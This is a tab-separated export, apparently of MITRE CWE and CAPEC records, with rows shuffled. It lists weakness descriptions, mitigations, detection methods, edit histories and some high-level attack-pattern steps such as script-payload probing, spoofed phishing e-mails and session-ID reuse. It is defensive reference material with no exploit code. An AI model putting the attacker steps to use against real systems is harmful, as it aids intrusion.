18377	102	CanFollow
20091	62	updated Applicable_Platforms, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Modes_of_Introduction, References, Relationships, Relevant_Properties
12825	74	1
9004	35	MITRE
12512	42	Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.                   This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.
9097	72	The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.
22199	28	CWE Content Team
19126	33	David F. Skoll
15600	92	Exploit
6115	62	updated References
17517	39	2017-01-19
16790	62	Changed name and description; clarified difference between "access control" and "authorization."
17417	56	CanPrecede
20267	39	2010-09-27
18798	56	ChildOf
24710	81	Availability
15561	42	Perform a type check before interpreting files.
25197	51	2014-06-23
16556	35	MITRE
6077	28	CWE Content Team
16908	100	The MITRE Corporation
14390	28	CWE Content Team
23200	77	Manual Static Analysis - Source Code
24841	88	Omission of Security-relevant Information
6037	63	Read Application Data
9489	62	updated Modes_of_Introduction, References, Relationships
14028	35	MITRE
14211	39	2009-05-27
17176	27	Ability to create spoofed GPS signals.
21387	35	MITRE
9067	63	Varies by Context
15670	26	Implementation
7204	39	2014-07-30
21493	62	updated Common_Consequences, Demonstrative_Examples
17735	46	When a resource is not released after use, it can allow attackers to cause a denial of service by causing the allocation of resources without triggering their release. Frequently-affected resources include memory, CPU, disk space, power or battery, etc.
21472	35	MITRE
20396	69	Incomplete
23258	35	MITRE
15447	85	552
8121	89	Detailed
7273	42	Programmers should adhere to the following rules when allocating and managing their applications memory: Double check that your buffer is as large as you specify. When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string. Check buffer boundaries if calling this function in a loop and make sure you are not in danger of writing past the allocated space. Truncate all input strings to a reasonable length before passing them to the copy and concatenation functions
15873	92	Explore
10378	97	PHP Local File Inclusion
19457	28	CWE Content Team
10874	97	Using a Snap Gun Lock to Force a Lock
25081	80	Able to develop and manufacture malicious hardware components that perform the same functions and processes as their non-malicious counterparts.
24140	23	The application does not handle or incorrectly handles when it has insufficient privileges to access resources or functionality as specified by their permissions. This may cause it to follow unexpected code paths that may leave the application in an invalid state.
16087	95	[Access or Modify Flash Application Variables] As the attacker succeeds in exploiting the vulnerability, he targets the content of the flash application to steal variable content, password, etc.
12490	103	Primary
7030	101	CAPEC Content Team
15877	59	Updated Related_Attack_Patterns
11921	26	Operation
22383	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
18176	40	The targeted developer must use a signing key to sign code bundles. (Note that not doing this is not a defense - it only means that the attacker does not need to steal the signing key before forging code bundles in the developer's name.)
6339	62	updated Time_of_Introduction
16983	35	MITRE
20770	62	updated Potential_Mitigations
15634	31	1000
8537	28	CWE Content Team
15782	62	updated Description, Potential_Mitigations
9409	28	CWE Content Team
13981	28	CWE Content Team
10205	69	Draft
14418	73	Use web browser to inject input through text fields or through HTTP GET parameters.
9902	78	High
23020	103	Primary
13159	78	High
20003	35	MITRE
16646	62	updated Taxonomy_Mappings
24394	68	Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment.
19328	39	2008-07-01
20766	46	An automated attacker could bypass the intended protection of the CAPTCHA challenge and perform actions at a higher frequency than humanly possible, such as launching spam attacks.             There can be several different causes of a guessable CAPTCHA:                                                An audio or visual image that does not have sufficient distortion from the unobfuscated source image.                   A question is generated that with a format that can be automatically recognized, such as a math question.                   A question for which the number of possible answers is limited, such as birth years or favorite sports teams.                   A general-knowledge or trivia question for which the answer can be accessed using a data base, such as country capitals or popular actors.                   Other data associated with the CAPTCHA may provide hints about its contents, such as an image whose filename contains the word that is used in the CAPTCHA.
9346	50	If possible use a sandbox model which limits the actions that programs can take. A sandbox restricts a program to a set of privileges and commands that make it difficult or impossible for the program to cause any damage.
6417	39	2010-02-16
18173	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer                                                                     Cost effective for partial coverage:                                                                           Source Code Quality Analyzer
16504	35	MITRE
24416	62	updated Detection_Factors
11180	22	04
20448	77	Dynamic Analysis with Manual Results Interpretation
6124	62	updated Other_Notes, Relationship_Notes
9020	28	CWE Content Team
19894	62	updated Applicable_Platforms, Description, Relationships, Observed_Example, Other_Notes, Weakness_Ordinalities
11881	74	4
19896	60	18
8693	35	MITRE
18397	50	Ensure to keep up to date with security relevant updates to the persistence framework used within your application.
20611	47	Other
15813	76	2017-01-09
24249	35	MITRE
9699	66	Multiple vendors XML parser (and SOAP/WebServices server) Denial of Service attack using DTD
20241	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings
23055	92	Explore
23793	46	If the object contains attributes that were only intended for internal use, then their unexpected modification could lead to a vulnerability.             This weakness is sometimes known by the language-specific mechanisms that make it possible, such as mass assignment, autobinding, or object injection.
11382	39	2012-05-11
18064	28	CWE Content Team
22687	62	updated Relationships
21244	35	MITRE
6953	96	2008-09-09
24016	79	Authorization
15481	23	The software does not properly handle when an input uses an alternate encoding that is valid for the control sphere to which the input is being sent.
14790	55	CAPEC Content Team
8411	62	updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Taxonomy_Mappings
17884	36	http://www.internetnews.com/dev-news/article.php/3289191
18698	44	SOAR Partial
5917	35	MITRE
25442	66	OWASP Enterprise Security API (ESAPI) Project
13435	35	MITRE
17013	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
15613	91	Architecture and Design
21001	63	Bypass Protection Mechanism
24979	62	updated Potential_Mitigations
20491	28	CWE Content Team
23560	33	Kevin Fu
14159	28	CWE Content Team
19502	39	2008-07-01
24556	81	Access Control
20900	72	The encrypted communication between a user and a trusted host may be subject to a "man in the middle" sniffing attack.
19209	35	MITRE
15840	85	393
23445	62	updated Observed_Examples
5866	62	updated Description, Name
18370	35	MITRE
20052	21	CWE Content Team
8170	42	Developers should anticipate that escape, meta and control characters/sequences will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
14533	35	MITRE
9327	24	MITRE
12641	62	updated Observed_Examples, Related_Attack_Patterns, Relationships
8943	102	ChildOf
20882	23	The software uses a database table that includes records that should not be accessible to an actor, but it executes a SQL statement with a primary key that can be controlled by that actor.
6793	55	CAPEC Content Team
9171	91	Implementation
24654	39	2017-11-08
8406	85	60
7262	35	MITRE
15965	35	MITRE
10945	63	Read Application Data
22467	35	MITRE
25104	28	CWE Content Team
18708	42	In the case of switch style statements, the very simple act of creating a default case can mitigate this situation, if done correctly. Often however, the default case is used simply to represent an assumed option, as opposed to working as a check for invalid input. This is poor practice and in some cases is as bad as omitting a default case entirely.
23713	42	Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
19494	35	MITRE
16527	84	22
21725	33	Adrienne Porter Felt
6366	39	2012-10-30
20726	81	Integrity
22107	80	Attacker must be able to create malformed data blobs and know how to insert them in a location that the recipient will visit.
24417	21	PLOVER
22187	43	Simple
23230	103	Primary
23966	40	HTTP protocol is used with some GET/POST parameters passed
12489	96	2018-07-02
15889	28	CWE Content Team
14675	89	Standard
15045	50	Reset the built-in KRBTGT account password twice to invalidate the existence of any current Golden Tickets and any tickets derived from them.
10402	35	MITRE
19336	35	MITRE
7681	28	CWE Content Team
20663	28	CWE Content Team
22233	91	Architecture and Design
8722	21	PLOVER
17002	35	MITRE
17265	39	2012-10-30
16438	51	2014-06-23
7406	101	CAPEC Content Team
13826	28	Eric Dalci
25064	35	MITRE
24269	39	2012-05-11
7859	50	Implementation: Load configuration from separate process and memory space, for example a separate physical device like a CD
24619	55	CAPEC Content Team
6913	35	MITRE
13873	81	Confidentiality
12762	90	Java
13939	46	This can allow the actor to perform actions more frequently than expected. The actor could be a human or an automated process such as a virus or bot. This could be used to cause a denial of service, compromise program logic (such as limiting humans to a single vote), or other consequences. For example, an authentication routine might not limit the number of times an attacker can guess a password. Or, a web site might conduct a poll but only expect humans to vote a maximum of once a day.
13638	28	CWE Content Team
22397	100	The MITRE Corporation
18517	39	2008-09-08
23945	100	The MITRE Corporation
20180	39	2019-01-03
19628	56	PeerOf
14624	95	[1. Attempt variations on argument content] Possibly using an automated tool, the attacker will perform injection variations of the arguments.
25243	28	CWE Content Team
8906	23	When an operating system starts, it also starts programs called services or daemons. Adversaries may install a new service which will be executed at startup (on a Windows system, by modifying the registry). The service name may be disguised by using a name from a related operating system or benign software. Services are usually run with elevated privileges.
7635	76	2015-12-07
6601	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.                   The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
14181	39	2010-06-21
24180	50	The Unicode Consortium recognized multiple representations to be a problem and has revised the Unicode Standard to make multiple representations of the same code point with UTF-8 illegal. The UTF-8 Corrigendum lists the newly restricted UTF-8 range (See references). Many current applications may not have been revised to follow this rule. Verify that your application conform to the latest UTF-8 encoding specification. Pay extra attention to the filtering of illegal characters.
19921	28	CWE Content Team
12817	76	2019-04-04
21890	62	updated Name
6609	104	419
16802	76	2019-09-30
21119	104	680
13386	62	updated Relationships, Taxonomy_Mappings
7950	100	The MITRE Corporation
24392	50	Pay attention to concurrency problems related to the access of resources.
8807	39	2019-01-03
19214	76	2019-04-04
11482	63	Modify Files or Directories
14128	31	699
11223	35	MITRE
15017	24	Fortify Software
8156	39	2009-03-10
22044	39	2018-03-27
12897	23	An adversary enumerates the MX records for a given via a DNS query. This type of information gathering returns the names of mail servers on the network. Mail servers are often not exposed to the Internet but are located within the DMZ of a network protected by a firewall. A side effect of this configuration is that enumerating the MX records for an organization my reveal the IP address of the firewall or possibly other internal systems. Attackers often resort to MX record enumeration when a DNS Zone Transfer is not possible.
8046	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
20060	76	2015-12-07
23633	28	CWE Content Team
9802	62	updated Applicable_Platforms, Modes_of_Introduction, Observed_Examples, Relationships
12435	28	CWE Content Team
22681	81	Other
10556	89	Detailed
18152	28	CWE Content Team
9576	40	An adversary must be aware that their message will be routed using a CDN, and that both of the contradictory domains are served from that CDN.
11678	39	2015-12-07
16625	76	2015-11-09
11832	77	Automated Dynamic Analysis
8978	101	CAPEC Content Team
10501	28	CWE Content Team
20094	48	11
9096	31	1000
17565	104	642
20569	40	Ability to issue GET / POST requests cross domainJava Script is enabled in the victim's browserThe victim has an active session with the site from which the attacker would like to receive informationThe victim's site does not protect search functionality with cross site request forgery (CSRF) protection
13434	31	1000
11596	88	J2EE Misconfiguration: Entity Bean Declared Remote
11597	70	RFC793 - Transmission Control Protocol
17266	86	http://www.cacr.math.uwaterloo.ca/hac/
12590	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
11275	21	CWE Content Team
12198	39	2017-11-08
10729	35	Cigital
11754	63	Varies by Context
11299	88	Inclusion of Web Functionality from an Untrusted Source
12585	56	ChildOf
17072	96	2009-03-03
25309	61	Draft
13339	101	CAPEC Content Team
19179	36	http://www.ibm.com/developerworks/linux/library/l-sprace/index.html
24948	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
20235	28	CWE Content Team
7690	27	None: No specialized resources are required to execute this type of attack.
12516	35	Cigital
8661	62	updated Relationships, Taxonomy_Mappings
5656	28	CWE Content Team
20609	88	Information Exposure of Internal State Through Behavioral Inconsistency
17219	86	http://msdn.microsoft.com/en-us/library/ms998283.aspx
20471	25	Low
22447	45	Base
23956	62	updated Detection_Factors, Relationships
15505	62	updated Common_Consequences
23713	91	Operation
12669	35	MITRE
24010	28	CWE Content Team
13270	35	MITRE
9154	62	updated Potential_Mitigations
10431	62	updated Relationships, White_Box_Definitions
11481	47	Modify Data
9150	100	The MITRE Corporation
20929	28	CWE Content Team
16905	28	CWE Content Team
20792	81	Integrity
19014	35	MITRE
6276	28	CWE Content Team
18915	31	1000
16235	50	Many tools are available to search for the hidden data. Scan regularly for such data using one of these tools.
10689	42	When allocating a buffer for the purpose of transforming, converting, or encoding an input, allocate enough memory to handle the largest possible encoding. For example, in a routine that converts "&" characters to "&amp;" for HTML entity encoding, the output buffer needs to be at least 5 times as large as the input buffer.
10745	44	High
12926	77	Manual Static Analysis - Binary or Bytecode
5621	35	MITRE
9158	62	updated Other_Notes, Research_Gaps
10296	28	Eric Dalci
15553	21	PLOVER
9902	40	The attacker will need either physical access or be able to supply malicious hardware components to the product development facility.
17925	71	2008
7038	39	2017-11-08
15623	43	Simple
9499	39	2010-09-27
5868	95	An attacker leverages the discovered weakness to decrypt, partially decrypt or infer some information about the contents of the encrypted message. All of that is done without knowing the secret key.
7823	72	Windows simple shortcuts, sometimes referred to as soft links, can be exploited remotely since a ".LNK" file can be uploaded like a normal file. This can enable remote execution.
15590	76	2018-07-31
11500	62	updated Relationships
13384	42	Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.
17701	39	2009-03-10
14510	62	updated References
14358	45	Base
18849	81	Confidentiality
22336	28	CWE Content Team
24788	39	2011-06-01
17525	73	Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.
14981	28	CWE Content Team
14295	39	2012-05-11
12912	28	CWE Content Team
14914	35	MITRE
13855	100	The MITRE Corporation
23736	53	The MITRE Corporation
15731	62	updated Potential_Mitigations
11113	56	ChildOf
16038	31	1000
6091	66	Input Validation with ESAPI - Very Important
9020	62	updated Common_Consequences
22881	35	MITRE
19873	24	MITRE
9336	35	MITRE
6940	62	updated Observed_Examples
13242	28	CWE Content Team
15595	104	201
6578	39	2019-06-20
11025	44	High
22523	39	2019-01-03
15562	50	Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.
21121	35	MITRE
19964	62	updated Relationships, Taxonomy_Mappings
12923	39	2014-07-30
12617	36	http://www.faqs.org/rfcs/rfc1122.html
24797	91	Architecture and Design
18911	28	CWE Content Team
13129	63	Modify Memory
9138	70	HTML URL Encoding Reference
15684	95	[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.
19538	46	Reference counts can be used when tracking how many objects contain a reference to a particular resource, such as in memory management or garbage collection. When the reference count reaches zero, the resource can be de-allocated or reused because there are no more objects that use it. If the reference count accidentally reaches zero, then the resource might be released too soon, even though it is still in use. If all objects no longer use the resource, but the reference count is not zero, then the resource might not ever be released.
22529	23	The program declares an array public, final, and static, which is not sufficient to prevent the array's contents from being modified.
15102	103	Primary
24954	62	updated Demonstrative_Examples, References
22278	39	2008-07-01
25009	35	Cigital
22422	78	High
13586	35	Cigital
19910	62	updated Potential_Mitigations
6958	62	updated Relationships, Taxonomy_Mappings
13580	28	CWE Content Team
16153	43	Simple
11556	35	MITRE
12310	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis                                                                     Cost effective for partial coverage:                                                                           Binary / Bytecode simple extractor – strings, ELF readers, etc.
24445	74	1
23320	35	Cigital
8928	97	Exploiting Incorrectly Configured SSL
16309	25	Medium
23392	39	2009-10-29
9626	61	Stable
8252	91	Implementation
9989	91	Implementation
17141	62	updated Relationships
11989	39	2013-02-21
13706	39	2008-07-01
10579	48	11
15635	43	Simple
16369	63	Read Application Data
9504	68	This is not a complete solution, since many buffer overflows are not related to strings.
18268	28	CWE Content Team
8854	63	Other
20551	35	MITRE
13793	60	15
12484	31	1000
24400	102	ChildOf
18683	49	2009
8374	35	MITRE
12760	39	2011-06-01
8202	35	MITRE
16275	62	updated Potential_Mitigations
24745	39	2011-06-27
11375	100	The MITRE Corporation
7516	54	Medium
24168	100	The MITRE Corporation
11698	93	Moderate
17087	31	699
23209	62	updated Taxonomy_Mappings
16756	102	ChildOf
23321	35	MITRE
20410	26	Implementation
17454	28	CWE Content Team
23639	66	Argument injection issues
17843	39	2011-06-01
6823	28	CWE Content Team
18650	25	Low
5841	91	Architecture and Design
16442	92	Explore
23628	67	High
7784	28	Eric Dalci
16562	100	The MITRE Corporation
9077	28	CWE Content Team
22531	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
20771	26	Implementation
21720	35	MITRE
11795	60	03
13447	50	Configuration: Disable client side caching.
10851	35	MITRE
23065	74	1
18813	63	DoS: Crash, Exit, or Restart
11119	28	CWE Content Team
11918	47	Gain Privileges
12033	62	updated Relationships
7661	35	MITRE
13559	55	CAPEC Content Team
10912	79	Integrity
10784	101	CAPEC Content Team
6751	28	CWE Content Team
18975	35	MITRE
13653	23	This attack exploits certain XML parsers which manage data in an inefficient manner. The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition owhere CPU resources are exhausted because of the parsing algorithm.
14240	42	An application must make resources available to a client commensurate with the client's access level.
17074	70	An Introduction to HTTP fingerprinting
22135	56	ChildOf
18688	73	Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.
21430	28	CWE Content Team
11662	23	The software does not handle when an inconsistency exists between two or more special characters or reserved words.
22553	40	The target application must utilize reflection libraries and allow users to directly control the parameters to these methods. If the adversary can host classes where the target can invoke them, more powerful variants of this attack are possible.
12940	51	2014-06-23
9364	35	MITRE
11643	28	CWE Content Team
16079	62	updated Modes_of_Introduction, References, Relationships
10420	62	updated Related_Attack_Patterns
15714	28	CWE Content Team
5690	62	updated Demonstrative_Examples
23394	73	Use other attack pattern or weakness to bypass authentication.
16783	35	Veracode
7027	69	Incomplete
18014	28	CWE Content Team
24475	28	CWE Content Team
10372	102	ChildOf
10954	73	Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.
7729	81	Access Control
7326	101	CAPEC Content Team
19280	46	If the software assumes that each resource has a unique identifier, the software could operate on the wrong resource if attackers can cause multiple resources to be associated with the same identifier.
14385	23	In this attack pattern, an adversary physically disables networking hardware by powering it down or disconnecting critical equipment. Disabling or shutting off critical system resources prevents them from performing their service as intended, which can have direct and indirect consequences on other systems. This attack pattern is considerably less technical than the selective blocking used in most obstruction attacks.
16525	35	MITRE
21389	62	updated Potential_Mitigations
14339	101	CAPEC Content Team
23416	35	MITRE
7266	67	Medium
7946	76	2019-04-04
15521	35	MITRE
5658	62	updated Relationships
19288	69	Incomplete
20822	79	Authorization
19828	76	2017-05-01
14908	62	updated Demonstrative_Examples
17318	33	Aishwarya Venkataraman
6644	25	Low
22684	79	Confidentiality
9832	28	CWE Content Team
7599	28	CWE Content Team
17315	88	Improper Neutralization of Line Delimiters
13774	101	CAPEC Content Team
16058	35	MITRE
20429	104	521
6033	74	2
11260	39	2008-10-14
24182	35	MITRE
8219	104	157
23277	35	MITRE
17027	35	MITRE
13312	69	Draft
9702	28	CWE Content Team
14953	47	Resource Consumption
14664	60	15
6419	50	Ensure that server side code can differentiate between legitimate requests and forged requests. The solution is similar to protection against Cross Site Request Forger (CSRF), which is to use a hard to guess random nonce (that is unique to the victim's session with the server) that the attacker has no way of knowing (at least in the absence of other weaknesses). Each request from the client to the server should contain this nonce and the server should reject all requests that do not contain the nonce.
23250	35	MITRE
12288	50	Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.
10867	88	URL Redirection to Untrusted Site ('Open Redirect')
10708	26	Implementation
13226	103	Primary
14872	89	Standard
11378	47	Gain Privileges
18367	28	CWE Content Team
9402	62	updated Potential_Mitigations
12576	76	2018-07-31
14937	28	CWE Content Team
20845	23	The application uses external input with reflection to select which classes or code to use, but it does not sufficiently prevent the input from selecting improper classes or code.
12432	51	2014-06-23
18244	35	MITRE
16393	96	2009-05-13
24116	81	Confidentiality
14428	28	CWE Content Team
19117	62	updated Potential_Mitigations
21731	28	CWE Content Team
14806	28	CWE Content Team
6710	100	The MITRE Corporation
7697	88	Authentication Bypass by Spoofing
9238	69	Incomplete
5856	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
15568	62	updated Relationships
20316	35	MITRE
19381	31	1000
20071	91	Implementation
6561	62	updated Relationships
21299	60	01
13986	31	1003
23232	28	CWE Content Team
19669	35	MITRE
22411	35	MITRE
15419	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer
8829	31	699
12502	62	updated Potential_Mitigations, Time_of_Introduction
24529	21	7 Pernicious Kingdoms
24072	92	Explore
15844	43	Simple
17125	90	Language-Independent
17954	72	It may be possible to cause data corruption and possibly execute arbitrary code by modifying global variables or data structures at unexpected times, violating the assumptions of code that uses this global data.
14928	39	2010-04-05
23417	56	ChildOf
14956	28	CWE Content Team
13679	23	Adversaries can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means. This can allow the adversary to access functionality the system's designer didn't intend for them to, but they may also go undetected or deny other users essential services in a catastrophic (or insidiously subtle) way.
24222	39	2017-11-08
17586	104	82
12213	47	Read Data
12090	56	ChildOf
6158	35	MITRE
14307	28	CWE Content Team
21800	39	2011-06-01
6200	28	CWE Content Team
12612	61	Draft
18824	28	CWE Content Team
17015	39	2013-02-21
18182	39	2011-06-01
24392	50	Use synchronization to control the flow of execution.
8966	89	Detailed
22496	47	Read Data
6939	35	MITRE
22755	62	updated Name, Potential_Mitigations
13822	28	CWE Content Team
17309	62	updated Alternate_Terms, Demonstrative_Examples, Description, Name, Other_Notes, References
6319	42	Developers should anticipate that grouping elements will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
24134	62	updated Demonstrative_Examples, Description, Maintenance_Notes, Other_Notes, Potential_Mitigations
13676	59	Updated References
9348	76	2018-07-31
17125	67	High
9532	28	CWE Content Team
23690	28	CWE Content Team
14847	62	updated Common_Consequences
9940	85	62
25343	28	CWE Content Team
23622	69	Draft
20849	62	updated Relationships, Taxonomy_Mappings
17789	31	1000
9282	70	Securing PHP: Step-by-Step
10548	51	2015-11-09
24447	57	Indirect
9457	50	Configuration: Ensure that remote scripts cannot be include in the "include" or "require" PHP directives
7361	95	[Identify target general susceptibility] An attacker uses an automated tool or manually finds whether the target application uses dynamically linked libraries and the configuration file or look up table (such as Procedure Linkage Table) which contains the entries for dynamically linked libraries.
5761	28	CWE Content Team
7056	94	Run Arbitrary Code
21747	62	updated Potential_Mitigations
5927	32	Phreedom.org
21992	28	CWE Content Team
13440	28	CWE Content Team
21941	28	CWE Content Team
20940	81	Integrity
14677	46	As data is parsed, an injected NUL character or null byte may cause the software to believe the input is terminated earlier than it actually is, or otherwise cause the input to be misinterpreted. This could then be used to inject potentially dangerous input that occurs after the null byte or otherwise bypass validation routines and other protection mechanisms.
22144	92	Explore
7194	39	2008-11-24
15964	63	DoS: Crash, Exit, or Restart
19067	45	Variant
22387	39	2012-05-11
18258	35	MITRE
20250	31	699
11975	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required, Typical_Likelihood_of_Exploit
17794	39	2017-11-08
13556	62	updated Potential_Mitigations
17428	47	Read Data
22665	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
14523	28	Eric Dalci
18422	88	Improper Handling of Inconsistent Structural Elements
16034	62	updated Relationships, Taxonomy_Mappings
17592	96	2010-12-12
16750	103	Primary
8564	79	Confidentiality
25381	44	SOAR Partial
19005	39	2012-05-11
11903	40	Targeted software is utilizing application framework APIs
18885	91	Architecture and Design
22137	28	CWE Content Team
14186	74	1
14967	56	ChildOf
12317	97	Cryptanalysis of Cellular Encryption
23416	62	updated Demonstrative_Examples, Related_Attack_Patterns, White_Box_Definitions
23817	88	Improper Neutralization of Input Terminators
21836	81	Other
21799	89	Detailed
6652	43	Simple
15196	23	HTTP Request Splitting (also known as HTTP Request Smuggling) is an attack pattern where an attacker attempts to insert additional HTTP requests in the body of the original (enveloping) HTTP request in such a way that the browser interprets it as one request but the web server interprets it as two. There are several ways to perform HTTP request splitting attacks. One way is to include double Content-Length headers in the request to exploit the fact that the devices parsing the request may each use a different header. Another way is to submit an HTTP request with a "Transfer Encoding: chunked" in the request header set with setRequestHeader to allow a payload in the HTTP Request that can be considered as another HTTP Request by a subsequent parsing entity. A third way is to use the "Double CR in an HTTP header" technique. There are also a few less general techniques targeting specific parsing vulnerabilities in certain web servers.
8084	62	updated Potential_Mitigations
22487	101	CAPEC Content Team
17050	62	updated Relationships, Other_Notes, Taxonomy_Mappings
20830	28	Eric Dalci
5957	39	2012-05-11
8136	73	Use an automated tool to record all instances of URLs to process XML requests.
15247	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, Relationships
23631	73	The attacker loads the predefined session ID into his software and utilizes functionality with the rights of the victim.
20798	28	CWE Content Team
8876	56	ChildOf
16171	28	CWE Content Team
23862	62	updated Description, Other_Notes
16106	28	CWE Content Team
23485	26	System Configuration
6772	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
11160	45	Variant
13382	42	Use length computing functions (e.g. strlen, wcslen, etc.) appropriately with their equivalent type (e.g.: byte, wchar_t, etc.)
6897	28	CWE Content Team
19973	39	2011-03-29
9851	42	Developers should anticipate that wildcard or matching elements will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
12469	26	Implementation
6933	66	The "Double-Checked Locking is Broken" Declaration
9774	42	Create resource-locking sanity checks. If no inherent locking mechanisms exist, use flags and signals to enforce your own blocking scheme when resources are being used by other threads of execution.
6296	94	Run Arbitrary Code
14194	39	2012-05-11
19462	80	To send XML messages with maliciously crafted DTDs.
7060	53	The MITRE Corporation
25208	52	This weakness can be found easily using static analysis. However in some cases an operator might appear to be incorrect, but is actually correct and reflects unusual logic within the program.
24066	46	The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the program violates the following EJB guideline: "An enterprise bean must not use the java.io package to attempt to access files and directories in the file system." The specification justifies this requirement in the following way: "The file system APIs are not well-suited for business components to access data. Business components should use a resource manager API, such as JDBC, to store data."
24572	89	Detailed
8387	56	ChildOf
19673	73	Sniff network communications with application using a utility such as WireShark.
6697	104	587
12509	81	Availability
17882	39	2013-02-21
21095	35	MITRE
8688	62	updated Relationships
24569	24	MITRE
17200	28	CWE Content Team
22150	50	Identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting tools.
20249	104	116
24149	28	CWE Content Team
22094	69	Incomplete
23436	39	2008-07-01
13828	39	2017-11-08
13008	28	CWE Content Team
13624	57	Primary
6041	76	2017-08-04
18450	22	12
8128	35	MITRE
25295	91	Architecture and Design
9535	47	Read Data
6349	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             This is similar to CWE-26, except using "\" instead of "/". The '\dir\..\filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only checks for "..\" at the beginning of the input, so a "\..\" can bypass that check.
16088	103	Primary
24208	59	Updated Attacker_Skills_or_Knowledge_Required, Resources_Required
17452	56	ChildOf
21090	39	2011-06-01
23118	39	2011-06-27
22565	28	CWE Content Team
16057	85	97
15114	28	CWE Content Team
12504	76	2018-07-31
14002	97	Navigation Remapping To Propagate Malicious Content
10350	39	2017-11-08
23058	62	updated Relationships, Taxonomy_Mappings
20239	28	CWE Content Team
6995	48	05
21553	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer                            Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
23069	62	updated Common_Consequences
24376	39	2011-06-01
25309	85	277
10813	62	updated Common_Consequences
22627	59	Updated Example_Instances
13614	62	updated Relationships, Taxonomy_Mappings
16999	62	updated Demonstrative_Examples, Relationships
16467	28	CWE Content Team
14957	39	2010-06-21
10586	102	ChildOf
10995	75	This is not a perfect solution, since 100% accuracy and coverage are not feasible.
12334	44	High
12893	39	2008-10-14
23263	78	Medium
23962	91	Implementation
18176	85	206
25383	25	Medium
25089	39	2010-12-13
16241	35	MITRE
14879	28	CWE Content Team
